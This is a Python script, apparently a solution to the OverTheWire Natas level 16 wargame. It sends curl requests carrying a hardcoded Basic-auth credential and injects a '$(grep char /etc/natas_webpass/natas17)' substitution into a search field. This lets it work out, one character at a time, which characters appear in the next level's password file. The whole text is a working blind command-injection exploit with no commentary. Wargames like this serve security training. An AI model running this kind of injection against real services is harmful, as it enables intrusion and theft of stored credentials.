import os

payload = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
access = "curl 'http://natas16.natas.labs.overthewire.org/'   -H 'Authorization: Basic TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V'   -H 'Connection: keep-alive'   -H 'Origin: http://natas16.natas.labs.overthewire.org'   -H 'Referer: http://natas16.natas.labs.overthewire.org/'   -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'   -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'   -H 'accept-language: en-US,en;q=0.9'   -H 'cache-control: max-age=0'   -H 'content-type: application/x-www-form-urlencoded'   -H 'dnt: 1'   -H 'sec-gpc: 1'   -H 'upgrade-insecure-requests: 1'  --insecure"

for char in payload:
    password = "--data-raw '?needle=doomed%24%28grep+{}+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search' ".format(char)
    print(password)
    full = access + " " + password

    stuff = os.popen(full).read()
    if "doomed" in stuff:
        print(char)